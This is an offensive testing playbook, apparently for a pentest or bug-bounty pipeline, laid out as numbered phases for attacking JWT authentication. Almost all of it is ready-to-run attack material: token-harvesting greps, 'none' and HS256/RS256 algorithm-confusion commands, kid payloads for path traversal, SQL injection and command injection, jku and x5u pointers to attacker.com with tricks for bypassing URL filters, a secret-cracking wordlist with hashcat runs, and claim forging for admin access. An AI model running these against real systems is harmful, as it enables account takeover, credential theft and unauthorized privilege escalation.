================================================================================
TASK 61 Â· JWT ATTACK SUITE
================================================================================
Covers testing_toolkit.txt Phase 7 Step 22
High-impact auth bypass via JWT vulnerabilities.

OBJECTIVE:
- Extract and analyze JWT tokens from all sources
- Exploit algorithm confusion (none, HS256â†”RS256)
- Abuse header injection (kid, jku, x5u, jwk)
- Crack weak secrets with optimized wordlists
- Forge administrative tokens for privilege escalation

================================================================================
INPUTS
================================================================================
outputs/har/accounts/*_auth.json          â† Auth tokens from HAR analysis (per-account)
outputs/har/common_data.txt               â† Endpoints from HAR analysis
outputs/live_base_urls.txt                â† Target hosts
outputs/api_endpoints_from_openapi.txt    â† API specs
temp/agent1/js_files.txt                  â† JS files (may contain secrets)

================================================================================
OUTPUTS
================================================================================
outputs/jwt_attacks/
â”œâ”€â”€ discovered_tokens.json         â† All extracted JWTs with metadata
â”œâ”€â”€ token_analysis.json            â† Decoded tokens with vulnerability flags
â”œâ”€â”€ algorithm_confusion.txt        â† Successful alg bypass results
â”œâ”€â”€ header_injection.txt           â† kid/jku/x5u exploitation results
â”œâ”€â”€ cracked_secrets.txt            â† Successfully cracked signing keys
â”œâ”€â”€ forged_tokens.json             â† Crafted tokens that work
â”œâ”€â”€ privilege_escalation.txt       â† Admin access confirmations
â””â”€â”€ scan_log.txt                   â† Full execution log

================================================================================
ğŸ§  JWT FUNDAMENTALS - UNDERSTAND BEFORE ATTACKING ğŸ§ 
================================================================================

â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
JWT Structure
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
Header.Payload.Signature (Base64URL encoded, dot-separated)

HEADER:
{
  "alg": "HS256",    â† Algorithm (CRITICAL - attack target)
  "typ": "JWT",
  "kid": "key-1"     â† Key ID (injection target)
}

PAYLOAD (Claims):
{
  "sub": "1234567890",     â† Subject (user ID)
  "name": "John Doe",
  "iat": 1516239022,       â† Issued at
  "exp": 1516242622,       â† Expiration
  "role": "user",          â† Role (escalation target)
  "admin": false           â† Admin flag (escalation target)
}

SIGNATURE:
HMACSHA256(
  base64UrlEncode(header) + "." + base64UrlEncode(payload),
  secret
)

â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
Algorithm Types
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
SYMMETRIC (same key signs & verifies):
- HS256, HS384, HS512 (HMAC + SHA)
- Secret must be KEPT SECRET

ASYMMETRIC (private signs, public verifies):
- RS256, RS384, RS512 (RSA)
- ES256, ES384, ES512 (ECDSA)
- PS256, PS384, PS512 (RSA-PSS)
- Public key can be exposed

NONE:
- No signature at all
- Should NEVER be accepted in production

================================================================================
PHASE 1: JWT DISCOVERY & EXTRACTION
================================================================================

â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
1.1 Extract from HAR Files
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
# Parse Authorization headers from HAR account files
# Each account has separate auth file: outputs/har/accounts/<name>_auth.json
for auth_file in outputs/har/accounts/*_auth.json; do
  jq -r '.headers[]? | select(.name | test("authorization|bearer"; "i")) | .value' "$auth_file"
done

# Look for Bearer tokens in raw HAR
grep -oP 'Bearer\s+\K[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+\.[A-Za-z0-9_-]*' manual/har/*.har

â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
1.2 Extract from Cookies
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
# Common JWT cookie names
# token, jwt, access_token, id_token, auth, session, auth_token

grep -oP '(token|jwt|access_token|id_token|auth|session)=[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+\.[A-Za-z0-9_-]*' cookies.txt

â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
1.3 Extract from Response Bodies
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
# JSON responses with tokens
grep -oP '"(token|jwt|access_token|id_token|accessToken|idToken)":\s*"[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+\.[A-Za-z0-9_-]*"' responses/

â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
1.4 Extract from JavaScript Files
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
# Hardcoded tokens or secrets in JS
grep -oP '[A-Za-z0-9_-]{20,}\.[A-Za-z0-9_-]{20,}\.[A-Za-z0-9_-]{20,}' temp/agent1/js_files.txt

# Look for signing secrets
grep -iP '(jwt|secret|signing|private).{0,20}(key|secret|password)' js_responses/

â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
1.5 Extract from Local Storage / URLs
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
# Sometimes tokens in URL parameters
grep -oP '[?&](token|jwt|access_token)=[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+\.[A-Za-z0-9_-]*' urls.txt

================================================================================
PHASE 2: TOKEN ANALYSIS
================================================================================

â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
2.1 Decode and Analyze with jwt_tool
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
# Basic decode
jwt_tool <TOKEN>

# Full scan mode (ALL checks)
jwt_tool <TOKEN> -M at

# Output shows:
# - Header (algorithm, kid, jku, etc.)
# - Payload (claims, roles, expiry)
# - Signature validity
# - Vulnerability suggestions

â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
2.2 Manual Decode (Understand Structure)
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
# Decode header
echo "HEADER_PART" | base64 -d 2>/dev/null | jq .

# Decode payload
echo "PAYLOAD_PART" | base64 -d 2>/dev/null | jq .

# Note: Base64URL uses - and _ instead of + and /
# May need to add padding (=) if decode fails

â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
2.3 Identify Attack Surface
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
CHECK HEADER FOR:
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚ Field     â”‚ Attack                              â”‚ Priority                  â”‚
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚ alg       â”‚ none, HS256/RS256 confusion         â”‚ ğŸ”´ CRITICAL               â”‚
â”‚ kid       â”‚ Path traversal, SQLi, Command inj   â”‚ ğŸ”´ CRITICAL               â”‚
â”‚ jku       â”‚ SSRF to attacker-controlled JWKS    â”‚ ğŸ”´ CRITICAL               â”‚
â”‚ x5u       â”‚ SSRF to attacker X.509 cert         â”‚ ğŸ”´ CRITICAL               â”‚
â”‚ x5c       â”‚ Embed attacker certificate          â”‚ ğŸŸ  HIGH                   â”‚
â”‚ jwk       â”‚ Embed attacker public key           â”‚ ğŸŸ  HIGH                   â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜

CHECK PAYLOAD FOR:
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚ Claim     â”‚ Tampering Goal                      â”‚ Priority                  â”‚
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚ sub       â”‚ Change user ID â†’ access other users â”‚ ğŸ”´ CRITICAL               â”‚
â”‚ role      â”‚ user â†’ admin                        â”‚ ğŸ”´ CRITICAL               â”‚
â”‚ admin     â”‚ false â†’ true                        â”‚ ğŸ”´ CRITICAL               â”‚
â”‚ groups    â”‚ Add admin group                     â”‚ ğŸ”´ CRITICAL               â”‚
â”‚ exp       â”‚ Extend expiration                   â”‚ ğŸŸ  HIGH                   â”‚
â”‚ iat       â”‚ Backdate token                      â”‚ ğŸŸ¡ MEDIUM                 â”‚
â”‚ iss       â”‚ Change issuer                       â”‚ ğŸŸ¡ MEDIUM                 â”‚
â”‚ aud       â”‚ Change audience                     â”‚ ğŸŸ¡ MEDIUM                 â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜

================================================================================
PHASE 3: ALGORITHM CONFUSION ATTACKS
================================================================================

â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
3.1 Algorithm "none" Attack
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
# CONCEPT: Set alg to "none" and remove signature
# Vulnerable servers accept unsigned tokens

# Using jwt_tool
jwt_tool <TOKEN> -X a

# Manual approach:
# 1. Decode header
# 2. Change "alg": "HS256" â†’ "alg": "none"
# 3. Re-encode header
# 4. Remove signature (empty string after last dot)
# 5. Result: header.payload. (note trailing dot, no signature)

# Variations to try:
# "alg": "none"
# "alg": "None"
# "alg": "NONE"
# "alg": "nOnE"

jwt_tool <TOKEN> -X a -I -pc role -pv admin

â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
3.2 HS256 / RS256 Confusion (KEY CONFUSION)
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
# CONCEPT: Server uses RS256 (asymmetric)
# Attack: Change alg to HS256 and sign with PUBLIC KEY as secret
# Result: Server uses public key to verify HMAC â†’ success!

# STEP 1: Get the public key
# From JWKS endpoint: /.well-known/jwks.json
# From x5c header in token
# From TLS certificate
# From JavaScript files

curl -s https://target.com/.well-known/jwks.json | jq .

# STEP 2: Convert JWKS to PEM (if needed)
# jwt_tool can handle this automatically

# STEP 3: Execute attack
jwt_tool <TOKEN> -X k -pk public_key.pem

# Or specify key directly
jwt_tool <TOKEN> -S hs256 -k "$(cat public_key.pem)"

â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
3.3 RS256 to HS256 with Extracted Key
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
#!/bin/bash
# key_confusion_attack.sh

TOKEN="$1"
TARGET="$2"

echo "[*] Fetching JWKS..."
curl -s "${TARGET}/.well-known/jwks.json" -o jwks.json

# Extract public key
echo "[*] Extracting public key..."
# Using jwt_tool's built-in conversion
jwt_tool "$TOKEN" -X k -pk jwks.json

# Or manual with openssl
# Extract n and e from JWKS, convert to PEM

echo "[*] Testing forged token..."

================================================================================
PHASE 4: HEADER INJECTION ATTACKS
================================================================================

â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
4.1 kid (Key ID) Injection
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
# CONCEPT: kid tells server which key to use for verification
# If kid is used in file path, database query, or command â†’ INJECTION

# PATH TRAVERSAL - Read arbitrary file as key
jwt_tool <TOKEN> -I -hc kid -hv "../../../../../../dev/null"
jwt_tool <TOKEN> -I -hc kid -hv "../../../../../../etc/passwd"
jwt_tool <TOKEN> -I -hc kid -hv "/dev/null" -S hs256 -p ""

# Key = empty file = empty secret = easy to sign!

# SQL INJECTION - Bypass key lookup
jwt_tool <TOKEN> -I -hc kid -hv "' UNION SELECT 'ATTACKER_KEY' -- "
jwt_tool <TOKEN> -I -hc kid -hv "1' OR '1'='1"
jwt_tool <TOKEN> -I -hc kid -hv "non_existent_key' OR 'x'='x"

# COMMAND INJECTION (rare but devastating)
jwt_tool <TOKEN> -I -hc kid -hv "key1|cat /etc/passwd"
jwt_tool <TOKEN> -I -hc kid -hv "key1;id;"
jwt_tool <TOKEN> -I -hc kid -hv "key1`id`"

â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
4.2 jku (JWK Set URL) SSRF
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
# CONCEPT: jku points to URL containing JWKS
# Attack: Point to attacker-controlled server with our keys

# STEP 1: Generate keypair
jwt_tool -nk -nkp jwttool_custom

# STEP 2: Create JWKS file with our public key
# jwt_tool generates: jwttool_custom_jwks.json

# STEP 3: Host JWKS on attacker server
python3 -m http.server 8080 &
# Or use Interactsh/ngrok

# STEP 4: Inject jku pointing to our server
jwt_tool <TOKEN> -X s -ju "https://attacker.com/jwttool_custom_jwks.json"

# Bypass techniques if URL validation exists:
jwt_tool <TOKEN> -I -hc jku -hv "https://trusted.com@attacker.com/jwks.json"
jwt_tool <TOKEN> -I -hc jku -hv "https://trusted.com%40attacker.com/jwks.json"
jwt_tool <TOKEN> -I -hc jku -hv "https://attacker.com/jwks.json#trusted.com"
jwt_tool <TOKEN> -I -hc jku -hv "https://attacker.com/jwks.json?.trusted.com"

â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
4.3 x5u (X.509 URL) SSRF
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
# Similar to jku but for X.509 certificate chains
jwt_tool <TOKEN> -X s -xu "https://attacker.com/cert.pem"

â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
4.4 x5c (Embedded Certificate)
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
# CONCEPT: x5c contains certificate chain in header
# Attack: Embed our own certificate

jwt_tool <TOKEN> -X c

# Manually craft with self-signed cert
openssl req -x509 -nodes -newkey rsa:2048 -keyout key.pem -out cert.pem -days 365

â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
4.5 jwk (Embedded Key)
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
# CONCEPT: jwk header contains the public key itself
# Attack: Embed our own key, sign with matching private key

jwt_tool <TOKEN> -X i

# Server trusts embedded key â†’ we control verification!

================================================================================
PHASE 5: SECRET CRACKING
================================================================================

â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
5.1 Optimized Wordlists for JWT
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
# ğŸ¯ BEST WORDLISTS FOR JWT SECRETS:

# 1. jwt-secrets.txt (curated JWT-specific)
# Common patterns: secret, password, jwt_secret, signing_key

# 2. SecLists JWT wordlist
# Location: SecLists/Passwords/JWT/jwt-secrets.txt

# 3. Common patterns to generate:
cat << 'EOF' > jwt_wordlist_custom.txt
secret
Secret
SECRET
password
Password
PASSWORD
jwt
JWT
jwt_secret
JWT_SECRET
jwtSecret
signing_key
SIGNING_KEY
signingKey
private_key
PRIVATE_KEY
privateKey
auth_secret
AUTH_SECRET
authSecret
token_secret
TOKEN_SECRET
tokenSecret
api_secret
API_SECRET
apiSecret
app_secret
APP_SECRET
appSecret
hmac_secret
HMAC_SECRET
hmacSecret
hs256_secret
HS256_SECRET
hs256Secret
key
Key
KEY
supersecret
SuperSecret
SUPERSECRET
changeme
Changeme
CHANGEME
123456
12345678
123456789
1234567890
qwerty
letmein
admin
administrator
root
toor
pass
passw0rd
p@ssw0rd
P@ssw0rd
s3cr3t
S3cr3t
S3CR3T
my_secret
my-secret
mysecret
the_secret
the-secret
thesecret
your_secret
your-secret
yoursecret
default
Default
DEFAULT
test
Test
TEST
dev
Dev
DEV
development
Development
DEVELOPMENT
production
Production
PRODUCTION
staging
Staging
STAGING
EOF

# 4. Company-specific patterns
# ${company}secret, ${company}_jwt, ${company}2024, etc.

â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
5.2 Crack with jwt_tool
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
# Basic dictionary attack
jwt_tool <TOKEN> -C -d jwt_wordlist_custom.txt

# With SecLists wordlist
jwt_tool <TOKEN> -C -d /usr/share/seclists/Passwords/JWT/jwt-secrets.txt

# Common passwords wordlist
jwt_tool <TOKEN> -C -d /usr/share/wordlists/rockyou.txt

â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
5.3 Crack with C-JWT-Cracker (Faster)
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
# Brute force (short secrets only)
jwtcrack <TOKEN>

# With alphabet specification
jwtcrack <TOKEN> -a "abcdefghijklmnopqrstuvwxyz0123456789"

# Maximum length
jwtcrack <TOKEN> -l 8

â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
5.4 Crack with hashcat (GPU-accelerated)
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
# Extract hash for hashcat
# JWT format: header.payload.signature
# hashcat mode 16500

# Create hash file
echo "<TOKEN>" > jwt_hash.txt

# Run hashcat
hashcat -m 16500 jwt_hash.txt wordlist.txt

# With rules for mutations
hashcat -m 16500 jwt_hash.txt wordlist.txt -r best64.rule

â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
5.5 Generate Target-Specific Wordlist
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
#!/bin/bash
# generate_jwt_wordlist.sh

COMPANY="$1"
YEAR=$(date +%Y)

cat << EOF
${COMPANY}
${COMPANY}123
${COMPANY}${YEAR}
${COMPANY}_secret
${COMPANY}_jwt
${COMPANY}_key
${COMPANY}Secret
${COMPANY}JWT
${COMPANY}Key
${COMPANY}_SECRET
${COMPANY}_JWT
${COMPANY}_KEY
jwt_${COMPANY}
secret_${COMPANY}
key_${COMPANY}
${COMPANY}!
${COMPANY}@123
${COMPANY}#${YEAR}
${COMPANY}Api
${COMPANY}API
${COMPANY}_api_key
${COMPANY}Auth
${COMPANY}Token
EOF

# Usage: ./generate_jwt_wordlist.sh acmecorp >> jwt_wordlist_custom.txt

================================================================================
PHASE 6: CLAIM TAMPERING & PRIVILEGE ESCALATION
================================================================================

â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
6.1 Modify Claims (After Cracking or Bypass)
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
# Change role to admin
jwt_tool <TOKEN> -I -pc role -pv admin -S hs256 -p "CRACKED_SECRET"

# Change admin flag
jwt_tool <TOKEN> -I -pc admin -pv true -S hs256 -p "CRACKED_SECRET"

# Change user ID (IDOR)
jwt_tool <TOKEN> -I -pc sub -pv 1 -S hs256 -p "CRACKED_SECRET"
jwt_tool <TOKEN> -I -pc user_id -pv 1 -S hs256 -p "CRACKED_SECRET"

# Add admin to groups array
jwt_tool <TOKEN> -I -pc groups -pv '["users","admin"]' -S hs256 -p "CRACKED_SECRET"

# Extend expiration
jwt_tool <TOKEN> -I -pc exp -pv 9999999999 -S hs256 -p "CRACKED_SECRET"

â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
6.2 Common Escalation Claims
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
# Role-based
-pc role -pv "admin"
-pc role -pv "superadmin"
-pc role -pv "root"
-pc role -pv "administrator"

# Boolean flags
-pc admin -pv true
-pc is_admin -pv true
-pc isAdmin -pv true
-pc superuser -pv true
-pc staff -pv true

# Permission arrays
-pc permissions -pv '["read","write","delete","admin"]'
-pc scopes -pv '["admin","*"]'

# Group membership
-pc groups -pv '["admin"]'
-pc roles -pv '["admin","user"]'

â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
6.3 Verify Escalation
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
# Test forged token against protected endpoint
curl -H "Authorization: Bearer FORGED_TOKEN" https://target.com/admin/users

